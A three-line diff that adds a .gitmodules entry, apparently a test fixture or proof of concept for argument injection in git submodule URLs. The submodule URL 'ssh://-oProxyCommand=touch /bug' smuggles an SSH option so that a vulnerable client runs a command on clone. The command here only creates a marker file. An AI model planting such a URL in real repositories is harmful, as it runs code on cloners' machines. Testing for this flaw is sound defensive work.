@@ -1,0 +1,3 @@
+[submodule "bug"]
+	path = bug
+	url = ssh://-oProxyCommand=touch /bug 
